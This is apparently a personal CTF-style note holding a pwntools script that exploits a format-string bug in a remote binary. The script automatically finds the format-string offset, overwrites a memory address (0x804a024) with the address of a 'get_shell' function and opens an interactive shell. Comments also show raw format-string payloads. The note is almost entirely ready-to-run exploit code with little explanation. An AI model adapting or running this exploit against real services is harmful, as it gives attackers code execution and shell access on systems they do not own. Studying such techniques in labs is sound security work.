---
title: "Format String (pwn)"
category: "pwn"
subcategory: "scripts"
type: "script"
tags: ["my-notes", "personal", "format-string", "format", "string", "pwn", "scripts"]
summary: "Personal note: Format String (pwn)."
source:
  name: "Personal notes"
origin_path: "scripts/pwn/Format String.md"
---

```python
# offset : 

# get_shell : 0x08048609

# r <<< $(python -c 'print "\x09\x86\x04\x08%x.%s"')

# <<< $(python -c 'print "\x09\x86\x04\x08%2$s"')

import sys
from pwn import *

def send_payload(payload):
    client.sendline(payload)
    return client.recvall()

client= remote(sys.argv[1], int(sys.argv[2]))
offset= FmtStr(execute_fmt= send_payload).offset

client= remote(sys.argv[1], int(sys.argv[2]))
payload= fmtstr_payload(offset, {0x804a024:0x08048609})
client.sendline(payload)
client.interactive()
```

---

*From your own notes: `scripts/pwn/Format String.md`*
